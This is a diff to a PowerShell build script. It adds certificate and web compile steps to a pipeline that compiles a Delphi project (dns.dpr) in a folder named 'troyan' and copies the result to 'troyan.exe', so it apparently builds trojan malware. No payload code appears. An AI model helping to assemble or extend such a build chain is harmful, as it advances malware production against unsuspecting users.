@@ -16,18 +16,34 @@ Write-Host "scriptDir: $scriptDir"
 Write-Host "currentDir: $currentDir"
 Write-Host "scriptDir: $scriptDir"
 Write-Host "serverFolder: $serverFolder"
+Write-Host "certDir: $certDir"
 
+
+#cert
+& (Join-Path -Path $scriptDir -ChildPath "./compile.cert.ps1") -serverName $serverName
+
+#clean
 $extensions = @(".dcu", ".res", ".exe")
 foreach ($ext in $extensions) {
     Get-ChildItem -Path $troyanDir -Filter "*$ext" | Remove-Item -Force
 }
 Get-ChildItem -Path $troyanDir -Filter "_*" | Remove-Item -Force
 
+#precompile
 & (Join-Path -Path $troyanDir -ChildPath "./precompile.ps1") -serverName $serverName
 
+#compile
 $dprFile = Join-Path -Path $troyanDir -ChildPath "dns.dpr"
 Set-Location -Path (Split-Path -Path $dprFile -Parent)
 & "C:\Program Files (x86)\Borland\Delphi7\Bin\dcc32.exe" "$dprFile"
 $exeFile = Join-Path -Path $troyanDir -ChildPath "dns.exe"
 $currentExeFile = Join-Path -Path $dataDir -ChildPath "troyan.exe"
 Copy-Item -Path $exeFile -Destination $currentExeFile -Force #>
+
+
+#web
+Set-Location -Path $scriptDir
+& (Join-Path -Path $scriptDir -ChildPath "./compile.web.ps1") -serverName $serverName
+
+
+
